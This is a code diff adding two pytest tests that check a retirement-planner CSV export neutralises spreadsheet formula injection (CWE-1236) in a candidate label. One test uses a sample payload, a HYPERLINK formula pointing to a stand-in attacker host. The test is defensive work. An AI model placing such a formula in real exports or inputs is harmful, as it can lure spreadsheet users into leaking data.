@@ -182,6 +182,39 @@ def test_comparison_exports_include_has_unverified_figure_column():
     assert "has_unverified_figure" in det_text.splitlines()[0]
 
 
+def test_comparison_candidate_label_with_leading_formula_char_is_csv_escaped():
+    """A candidate_label sourced from a free-text BFF request field (no
+    Pydantic validation on shape/content -- see
+    services/bff/src/rp_bff/comparison_candidates.py) must not reach the
+    exported CSV as an evaluable spreadsheet formula (CWE-1236). A leading
+    '=' (or +, -, @) is neutralized with a leading single quote, matching
+    Excel/LibreOffice's own "treat as text" convention -- the label is
+    otherwise preserved verbatim."""
+    from retirement_planner.reporting.export import simulation_comparison_to_csv_text
+
+    payload = '=HYPERLINK("http://attacker.example/steal","click")'
+    run = _run(path_results=[_PROJECTION_A], candidate_label=payload)
+    comparison = SimulationComparisonResult(axis="state", return_paths=[], runs=[run])
+
+    text = simulation_comparison_to_csv_text(comparison, household=_HOUSEHOLD, reference_tax_year=2026)
+    rows = _rows(text)
+
+    assert rows[0]["candidate_label"] == "'" + payload
+    assert not rows[0]["candidate_label"].startswith(("=", "+", "-", "@"))
+
+
+def test_comparison_candidate_label_without_formula_char_is_unchanged():
+    from retirement_planner.reporting.export import simulation_comparison_to_csv_text
+
+    run = _run(path_results=[_PROJECTION_A], candidate_label="South Carolina")
+    comparison = SimulationComparisonResult(axis="state", return_paths=[], runs=[run])
+
+    text = simulation_comparison_to_csv_text(comparison, household=_HOUSEHOLD, reference_tax_year=2026)
+    rows = _rows(text)
+
+    assert rows[0]["candidate_label"] == "South Carolina"
+
+
 def test_comparison_exports_include_irmaa_and_niit_columns():
     """010-advanced-tax-benefits T031: mirrors the has_unverified_figure
     column check above for the two new cumulative-figure columns."""
